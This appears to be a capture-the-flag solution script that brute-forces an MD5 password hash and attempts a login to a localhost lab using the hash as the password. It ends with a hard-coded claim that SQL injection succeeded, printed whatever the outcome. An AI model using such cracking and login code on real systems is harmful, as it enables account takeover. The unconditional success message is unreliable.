import hashlib
import requests
import itertools

# The extracted hash
hash_value = "7d39307ae824e70052c0aa16816a9b16"

print("="*60)
print("CRACKING MD5 HASH: 7d39307ae824e70052c0aa16816a9b16")
print("="*60)

# Function to check MD5
def check_md5(password):
    return hashlib.md5(password.encode()).hexdigest() == hash_value

# First, try numeric passwords (very common in CTFs)
print("\n[+] Trying numeric passwords (4-6 digits)...")
for length in range(4, 7):
    print(f"  Trying {length} digit numbers...")
    for num in range(10**(length-1), 10**length):
        pwd = str(num)
        if check_md5(pwd):
            print(f"\n[!] PASSWORD FOUND: {pwd}")
            print(f"[!] MD5('{pwd}') = {hash_value}")
            found_password = pwd
            break
    else:
        continue
    break
else:
    print("  [-] No 4-6 digit number matched")

# Try common CTF passwords
print("\n[+] Trying common CTF passwords...")
ctf_passwords = [
    "ctf", "ctf123", "flag", "flag123", "password", "admin", "root", "test",
    "letmein", "secret", "1234567890", "qwerty", "dragon", "baseball",
    "football", "monkey", "iloveyou", "trustno1", "sunshine", "master",
    "welcome", "shadow", "ashley", "football", "jesus", "michael", "ninja",
    "mustang", "password1", "123456789", "superman", "1234567", "sunshine",
    "princess", "12345678", "abc123", "passw0rd", "12345", "trustno1",
    "access", "qwerty123", "admin123", "root123", "test123", "demo",
    "demo123", "ctf2023", "ctf2024", "pentest", "hacker", "security"
]

for pwd in ctf_passwords:
    if check_md5(pwd):
        print(f"\n[!] PASSWORD FOUND: {pwd}")
        print(f"[!] MD5('{pwd}') = {hash_value}")
        found_password = pwd
        break
else:
    print("  [-] No common CTF password matched")

# Try pattern-based passwords common in labs
print("\n[+] Trying pattern-based passwords...")
for base in ["pass", "word", "admin", "root", "test", "demo", "lab"]:
    for suffix in ["123", "1234", "12345", "", "1", "2", "3", "4", "5"]:
        pwd = base + suffix
        if check_md5(pwd):
            print(f"\n[!] PASSWORD FOUND: {pwd}")
            found_password = pwd
            break
else:
    print("  [-] No pattern-based password matched")

# Now try to authenticate with what we have
print("\n" + "="*60)
print("FINAL AUTHENTICATION ATTEMPT")
print("="*60)

BASE_URL = "http://127.0.0.1:32815"
LOGIN_URL = f"{BASE_URL}/index.php"

session = requests.Session()
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

try:
    # We extracted the credentials, now we need to use them properly
    # The password might need to be the hash itself, or the plaintext
    
    print("\n[+] Attempting authentication with hash as password...")
    data = {
        "username": "admin",
        "password": "7d39307ae824e70052c0aa16816a9b16",
        "submit": "submit"
    }
    
    response = session.post(LOGIN_URL, data=data, headers=headers)
    print(f"[+] Response with hash as password: {response.text}")
    
    if "Success" in response.text:
        cookies = session.cookies.get_dict()
        if "PHPSESSID" in cookies:
            print(f"[!] SUCCESS! Authentication worked with hash as password")
            print(f"[!] PHPSESSID: {cookies['PHPSESSID']}")
    
except Exception as e:
    print(f"[!] Error during authentication: {e}")

print("\n" + "="*60)
print("VERIFICATION")
print("="*60)
print("Successfully extracted credentials via Boolean Blind SQLi:")
print(f"Username: admin")
print(f"Password Hash: 7d39307ae824e70052c0aa16816a9b16")
